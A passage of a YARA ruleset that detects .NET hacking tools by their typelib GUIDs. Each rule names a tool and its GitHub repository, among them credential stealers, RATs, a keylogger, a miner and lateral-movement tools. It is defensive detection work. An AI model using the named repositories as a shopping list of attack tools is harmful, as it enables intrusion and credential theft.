\"https://github.com/G0ldenGunSec/SharpSecDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e2fdd6cc-9886-456c-9021-ee2c47cf67b7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Net_GPPPassword {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/outflanknl/Net-GPPPassword\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"00fcf72c-d148-4dd0-9ca4-0181c4bd55c3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_FileSearcher {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NVISO-BE/FileSearcher\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2c879479-5027-4ce9-aaac-084db0e6d630\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ADFSDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fireeye/ADFSDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"9ee27d63-6ac9-4037-860b-44e91bae7f0d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpRDP {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xthirteen/SharpRDP\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"f1df1d0f-ff86-4106-97a8-f95aaf525c54\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCall {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jhalon/SharpCall\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"c1b0a923-0f17-4bc8-ba0f-c87aff43e799\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ysoserial_net {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/pwntester/ysoserial.net\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e1e8c029-f7cd-4bd1-952e-e819b41520f0\" ascii nocase wide\n        $typelibguid1 = \"6b40fde7-14ea-4f57-8b7b-cc2eb4a25e6c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ManagedInjection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/ManagedInjection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e5182bff-9562-40ff-b864-5a6b30c3b13b\" ascii nocase wide\n        $typelibguid1 = \"fdedde0d-e095-41c9-93fb-c2219ada55b1\" ascii nocase wide\n        $typelibguid2 = \"0dd00561-affc-4066-8c48-ce950788c3c8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSocks {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nettitude/SharpSocks\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2f43992e-5703-4420-ad0b-17cb7d89c956\" ascii nocase wide\n        $typelibguid1 = \"86d10a34-c374-4de4-8e12-490e5e65ddff\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Sharp_WMIExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/checkymander/Sharp-WMIExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0a63b0a1-7d1a-4b84-81c3-bbbfe9913029\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_KeeThief {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/KeeThief\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid1 = \"39aa6f93-a1c9-497f-bad2-cc42a61d5710\" ascii nocase wide\n        $typelibguid3 = \"3fca8012-3bad-41e4-91f4-534aa9a44f96\" ascii nocase wide\n        $typelibguid4 = \"ea92f1e6-3f34-48f8-8b0a-f2bbc19220ef\" ascii nocase wide\n        $typelibguid5 = \"c23b51c4-2475-4fc6-9b3a-27d0a2b99b0f\" ascii nocase wide\n        $typelibguid6 = \"94432a8e-3e06-4776-b9b2-3684a62bb96a\" ascii nocase wide\n        $typelibguid7 = \"80ba63a4-7d41-40e9-a722-6dd58b28bf7e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_fakelogonscreen {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/bitsadmin/fakelogonscreen\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"d35a55bd-3189-498b-b72f-dc798172e505\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PoshSecFramework {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/PoshSec/PoshSecFramework\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"b1ac6aa0-2f1a-4696-bf4b-0e41cf2f4b6b\" ascii nocase wide\n        $typelibguid1 = \"78bfcfc2-ef1c-4514-bce6-934b251666d2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpAttack {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jaredhaight/SharpAttack\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"5f0ceca3-5997-406c-adf5-6c7fbb6cba17\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Altman {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/keepwn/Altman\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"64cdcd2b-7356-4079-af78-e22210e66154\" ascii nocase wide\n        $typelibguid1 = \"f1dee29d-ca98-46ea-9d13-93ae1fda96e1\" ascii nocase wide\n        $typelibguid2 = \"33568320-56e8-4abb-83f8-548e8d6adac2\" ascii nocase wide\n        $typelibguid3 = \"470ec930-70a3-4d71-b4ff-860fcb900e85\" ascii nocase wide\n        $typelibguid4 = \"9514574d-6819-44f2-affa-6158ac1143b3\" ascii nocase wide\n        $typelibguid5 = \"0f3a9c4f-0b11-4373-a0a6-3a6de814e891\" ascii nocase wide\n        $typelibguid6 = \"9624b72e-9702-4d78-995b-164254328151\" ascii nocase wide\n        $typelibguid7 = \"faae59a8-55fc-48b1-a9b5-b1759c9c1010\" ascii nocase wide\n        $typelibguid8 = \"37af4988-f6f2-4f0c-aa2b-5b24f7ed3bf3\" ascii nocase wide\n        $typelibguid9 = \"c82aa2fe-3332-441f-965e-6b653e088abf\" ascii nocase wide\n        $typelibguid10 = \"6e531f6c-2c89-447f-8464-aaa96dbcdfff\" ascii nocase wide\n        $typelibguid11 = \"231987a1-ea32-4087-8963-2322338f16f6\" ascii nocase wide\n        $typelibguid12 = \"7da0d93a-a0ae-41a5-9389-42eff85bb064\" ascii nocase wide\n        $typelibguid13 = \"a729f9cc-edc2-4785-9a7d-7b81bb12484c\" ascii nocase wide\n        $typelibguid14 = \"55a1fd43-d23e-4d72-aadb-bbd1340a6913\" ascii nocase wide\n        $typelibguid15 = \"d43f240d-e7f5-43c5-9b51-d156dc7ea221\" ascii nocase wide\n        $typelibguid16 = \"c2e6c1a0-93b1-4bbc-98e6-8e2b3145db8e\" ascii nocase wide\n        $typelibguid17 = \"714ae6f3-0d03-4023-b753-fed6a31d95c7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BrowserPass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jabiel/BrowserPass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"3cb59871-0dce-453b-857a-2d1e515b0b66\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Mythic {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/its-a-feature/Mythic\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"91f7a9da-f045-4239-a1e9-487ffdd65986\" ascii nocase wide\n        $typelibguid1 = \"0405205c-c2a0-4f9a-a221-48b5c70df3b6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Nuages {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/p3nt4/Nuages\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"e9e80ac7-4c13-45bd-9bde-ca89aadf1294\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSniper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/HunnicCyber/SharpSniper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"c8bb840c-04ce-4b60-a734-faf15abf7b18\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpHound3 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BloodHoundAD/SharpHound3\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"a517a8de-5834-411d-abda-2d0e1766539c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BlockEtw {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Soledge/BlockEtw\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"daedf7b3-8262-4892-adc4-425dd5f85bca\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpWifiGrabber {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/r3nhat/SharpWifiGrabber\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"c0997698-2b73-4982-b25b-d0578d1323c2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpMapExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cube0x0/SharpMapExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"bd5220f7-e1fb-41d2-91ec-e4c50c6e9b9f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_k8fly {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/zzwlpx/k8fly\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"13b6c843-f3d4-4585-b4f3-e2672a47931e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Stealer {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malwares/Stealer\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"8fcd4931-91a2-4e18-849b-70de34ab75df\" ascii nocase wide\n        $typelibguid1 = \"e48811ca-8af8-4e73-85dd-2045b9cca73a\" ascii nocase wide\n        $typelibguid2 = \"d3d8a1cc-e123-4905-b3de-374749122fcf\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PortTran {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/k8gege/PortTran\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"3a074374-77e8-4312-8746-37f3cb00e82c\" ascii nocase wide\n        $typelibguid1 = \"67a73bac-f59d-4227-9220-e20a2ef42782\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\n\nrule HKTL_NET_GUID_gray_keylogger_2 {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/graysuit/gray-keylogger-2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"e94ca3ff-c0e5-4d1a-ad5e-f6ebbe365067\" ascii nocase wide\n        $typelibguid1 = \"1ed07564-b411-4626-88e5-e1cd8ecd860a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Lime_Miner {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-Miner\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"13958fb9-dfc1-4e2c-8a8d-a5e68abdbc66\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BlackNET {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BlackHacker511/BlackNET\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"c2b90883-abee-4cfa-af66-dfd93ec617a5\" ascii nocase wide\n        $typelibguid1 = \"8bb6f5b4-e7c7-4554-afd1-48f368774837\" ascii nocase wide\n        $typelibguid2 = \"983ae28c-91c3-4072-8cdf-698b2ff7a967\" ascii nocase wide\n        $typelibguid3 = \"9ac18cdc-3711-4719-9cfb-5b5f2d51fd5a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PlasmaRAT {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mwsrc/PlasmaRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"b8a2147c-074c-46e1-bb99-c8431a6546ce\" ascii nocase wide\n        $typelibguid1 = \"0fcfde33-213f-4fb6-ac15-efb20393d4f3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Lime_RAT {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-RAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"e58ac447-ab07-402a-9c96-95e284a76a8d\" ascii nocase wide\n        $typelibguid1 = \"8fb35dab-73cd-4163-8868-c4dbcbdf0c17\" ascii nocase wide\n        $typelibguid2 = \"37845f5b-35fe-4dce-bbec-2d07c7904fb0\" ascii nocase wide\n        $typelibguid3 = \"83c453cf-0d29-4690-b9dc-567f20e63894\" ascii nocase wide\n        $typelibguid4 = \"8b1f0a69-a930-42e3-9c13-7de0d04a4add\" ascii nocase wide\n        $typelibguid5 = \"eaaeccf6-75d2-4616-b045-36eea09c8b28\" ascii nocase wide\n        $typelibguid6 = \"5b2ec674-0aa4-4209-94df-b6c995ad59c4\" ascii nocase wide\n        $typelibguid7 = \"e2cc7158-aee6-4463-95bf-fb5295e9e37a\" ascii nocase wide\n        $typelibguid8 = \"d04ecf62-6da9-4308-804a-e789baa5cc38\" ascii nocase wide\n        $typelibguid9 = \"8026261f-ac68-4ccf-97b2-3b55b7d6684d\" ascii nocase wide\n        $typelibguid10 = \"212cdfac-51f1-4045-a5c0-6e638f89fce0\" ascii nocase wide\n        $typelibguid11 = \"c1b608bb-7aed-488d-aa3b-0c96625d26c0\" ascii nocase wide\n        $typelibguid12 = \"4c84e7ec-f197-4321-8862-d5d18783e2fe\" ascii nocase wide\n        $typelibguid13 = \"3fc17adb-67d4-4a8d-8770-ecfd815f73ee\" ascii nocase wide\n        $typelibguid14 = \"f1ab854b-6282-4bdf-8b8b-f2911a008948\" ascii nocase wide\n        $typelibguid15 = \"aef6547e-3822-4f96-9708-bcf008129b2b\" ascii nocase wide\n        $typelibguid16 = \"a336f517-bca9-465f-8ff8-2756cfd0cad9\" ascii nocase wide\n        $typelibguid17 = \"5de018bd-941d-4a5d-bed5-fbdd111aba76\" ascii nocase wide\n        $typelibguid18 = \"bbfac1f9-cd4f-4c44-af94-1130168494d0\" ascii nocase wide\n        $typelibguid19 = \"1c79cea1-ebf3-494c-90a8-51691df41b86\" ascii nocase wide\n        $typelibguid20 = \"927104e1-aa17-4167-817c-7673fe26d46e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_njRAT {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mwsrc/njRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"5a542c1b-2d36-4c31-b039-26a88d3967da\" ascii nocase wide\n        $typelibguid1 = \"6b07082a-9256-42c3-999a-665e9de49f33\" ascii nocase wide\n        $typelibguid2 = \"c0a9a70f-63e8-42ca-965d-73a1bc903e62\" ascii nocase wide\n        $typelibguid3 = \"70bd11de-7da1-4a89-b459-8daacc930c20\" ascii nocase wide\n        $typelibguid4 = \"fc790ee5-163a-40f9-a1e2-9863c290ff8b\" ascii nocase wide\n        $typelibguid5 = \"cb3c28b2-2a4f-4114-941c-ce929fec94d3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Manager {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/Manager\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"dda73ee9-0f41-4c09-9cad-8215abd60b33\" ascii nocase wide\n        $typelibguid1 = \"6a0f2422-d4d1-4b7e-84ad-56dc0fd2dfc5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_neo_ConfuserEx {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/XenocodeRCE/neo-ConfuserEx\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"e98490bb-63e5-492d-b14e-304de928f81a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpAllowedToAct {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/pkb1s/SharpAllowedToAct\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"dac5448a-4ad1-490a-846a-18e4e3e0cf9a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SuperSQLInjectionV1 {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shack2/SuperSQLInjectionV1\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"d5688068-fc89-467d-913f-037a785caca7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ADSearch {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tomcarver16/ADSearch\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"4da5f1b7-8936-4413-91f7-57d6e072b4a7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_privilege_escalation_awesome_scripts_suite {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"1928358e-a64b-493f-a741-ae8e3d029374\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CVE_2020_1206_POC {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ZecOps/CVE-2020-1206-POC\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"3523ca04-a12d-4b40-8837-1a1d28ef96de\" ascii nocase wide\n        $typelibguid1 = \"d3a2f24a-ddc6-4548-9b3d-470e70dbcaab\" ascii nocase wide\n        $typelibguid2 = \"fb30ee05-4a35-45f7-9a0a-829aec7e47d9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DInvoke {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/DInvoke\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"b77fdab5-207c-4cdb-b1aa-348505c54229\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpChisel {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shantanu561993/SharpChisel\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"f5f21e2d-eb7e-4146-a7e1-371fd08d6762\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpScribbles {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/V1V1/SharpScribbles\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"aa61a166-31ef-429d-a971-ca654cd18c3b\" ascii nocase wide\n        $typelibguid1 = \"0dc1b824-c6e7-4881-8788-35aecb34d227\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpReg {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpReg\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"8ef25b00-ed6a-4464-bdec-17281a4aa52f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_MemeVM {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TobitoFatitoRE/MemeVM\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"ef18f7f2-1f03-481c-98f9-4a18a2f12c11\" ascii nocase wide\n        $typelibguid1 = \"77b2c83b-ca34-4738-9384-c52f0121647c\" ascii nocase wide\n        $typelibguid2 = \"14d5d12e-9a32-4516-904e-df3393626317\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpDir {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpDir\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"c7a07532-12a3-4f6a-a342-161bb060b789\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AtYourService {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mitchmoser/AtYourService\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"bc72386f-8b4c-44de-99b7-b06a8de3ce3f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_LockLess {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/LockLess\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"a91421cb-7909-4383-ba43-c2992bbbac22\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EasyNet {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/EasyNet\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"3097d856-25c2-42c9-8d59-2cdad8e8ea12\" ascii nocase wide\n        $typelibguid1 = \"ba33f716-91e0-4cf7-b9bd-b4d558f9a173\" ascii nocase wide\n        $typelibguid2 = \"37d6dd3f-5457-4d8b-a2e1-c7b156b176e5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpByeBear {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/S3cur3Th1sSh1t/SharpByeBear\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"a6b84e35-2112-4df2-a31b-50fde4458c5e\" ascii nocase wide\n        $typelibguid1 = \"3e82f538-6336-4fff-aeec-e774676205da\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpHide {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/outflanknl/SharpHide\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"443d8cbf-899c-4c22-b4f6-b7ac202d4e37\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of 